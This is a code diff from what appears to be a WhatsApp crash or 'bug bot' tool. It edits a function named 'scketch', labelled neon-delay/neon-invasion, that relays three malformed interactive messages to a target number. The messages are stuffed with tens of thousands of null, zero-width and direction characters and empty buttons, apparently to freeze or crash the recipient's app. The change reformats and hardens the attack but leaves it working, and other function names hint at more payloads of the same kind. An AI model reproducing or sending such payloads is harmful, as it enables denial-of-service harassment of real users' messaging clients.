@@ -2631,62 +2631,66 @@ async function _epcihDiley(sock, target) {
 }
 
 // ── FcXDelay (neon-delay / neon-invasion) ──
-async function scketch(sock, target) {
-      const msg1 = {
+async function scketch(neon, target) {
+    if (!target || typeof target !== "string") {
+        console.log("scketch: invalid target →", target)
+        return
+    }
+
+    const msg1 = {
         groupStatusMessageV2: {
-          message: {
-            interactiveMessage: {
-              body: { text: "  \u200E\0".repeat(10000) },
-              nativeFlowMessage: {
-                buttons: Array.from({ length: 0x4e21 }, () => ({})),
-                messageVersion: 1
-              }
+            message: {
+                interactiveMessage: {
+                    body: { text: "  \u200E\0".repeat(10000) },
+                    nativeFlowMessage: {
+                        buttons: Array.from({ length: 0x4e21 }, () => ({})),
+                        messageVersion: 1
+                    }
+                }
             }
-          }
         }
-      };
+    };
 
-      const msg2 = {
+    const msg2 = {
         viewOnceMessage: {
-          message: {
-            interactiveMessage: {
-              body: { text: "JUST END NOW" + "\u200B".repeat(10000) },
-              nativeFlowMessage: {
-                buttons: [
-                  {
-                    name: "order_status",
-                    buttonParamsJson: '{"order_id":"' + "\0".repeat(100000) +
-                                      '","order_title":"' + "\0".repeat(70000) +
-                                      '","status":"PROCESSING","token":"sgL4_dxscbfayun","flow_message_version":"1"}'
-                  },
-                  ...Array.from({ length: 0x4e22 }, () => ({}))
-                ],
-                messageVersion: 1
-              }
+            message: {
+                interactiveMessage: {
+                    body: { text: "JUST END NOW" + "\u200B".repeat(10000) },
+                    nativeFlowMessage: {
+                        buttons: [
+                            {
+                                name: "order_status",
+                                buttonParamsJson: '{"order_id":"' + "\0".repeat(100000) +
+                                                  '","order_title":"' + "\0".repeat(70000) +
+                                                  '","status":"PROCESSING","token":"sgL4_dxscbfayun","flow_message_version":"1"}'
+                            },
+                            ...Array.from({ length: 0x4e22 }, () => ({}))
+                        ],
+                        messageVersion: 1
+                    }
+                }
             }
-          }
         }
-      };
+    };
 
-      const msg3 = {
+    const msg3 = {
         viewOnceMessage: {
-          message: {
-            interactiveMessage: {
-              body: { text: "\r" },
-              nativeFlowMessage: {
-                buttons: Array.from({ length: 0xc350 * 2 }, () => ({})),
-                messageVersion: 1
-              }
+            message: {
+                interactiveMessage: {
+                    body: { text: "\r" },
+                    nativeFlowMessage: {
+                        buttons: Array.from({ length: 0xc350 * 2 }, () => ({})),
+                        messageVersion: 1
+                    }
+                }
             }
-          }
         }
-      };
+    };
 
-      await sock.relayMessage(target, msg1, {});
-      await sock.relayMessage(target, msg2, {});
-      await sock.relayMessage(target, msg3, {});
+    await neon.relayMessage(target, msg1, {}).catch(e => console.log("scketch msg1:", e.message));
+    await neon.relayMessage(target, msg2, {}).catch(e => console.log("scketch msg2:", e.message));
+    await neon.relayMessage(target, msg3, {}).catch(e => console.log("scketch msg3:", e.message));
 }
-
 // ── DelaFreezCloseRelay (neon-delay wave 1) ──
 async function _delaFreezCloseRelay(sock, target) {
   try {
